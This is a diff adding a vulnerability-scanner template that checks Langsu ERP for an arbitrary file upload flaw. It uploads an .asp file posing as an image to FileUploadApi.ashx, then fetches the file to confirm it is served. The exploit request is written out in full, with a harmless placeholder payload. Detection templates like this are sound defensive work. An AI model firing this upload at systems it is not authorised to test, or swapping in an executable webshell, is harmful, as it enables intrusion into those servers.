@@ -1,0 +1,64 @@
+id: poc-lserp-fileuploadapi-ashx-anyfile-upload
+
+info:
+  name: Langsu ERP FileUploadApi.ashx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /Api/FileUploadApi.ashx?method=DoWebUpload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+        Content-Disposition: form-data; name="file"; filename="{{t1}}.asp"
+        Content-Type: image/jpeg
+
+        {{t2}}
+        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"Success\":true"
+        part: body
+      - type: regex
+        regex:
+          - "\"WebRelPath\":\"/(?P<file>.*?).asp"
+        part: body
+
+    extractors:
+      - type: regex
+        name: file_path
+        regex:
+          - "\"WebRelPath\":\"/(?P<file>.*?).asp"
+        group: 1
+        internal: true
+
+  - raw:
+      - |
+        GET /{{file_path}}.asp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
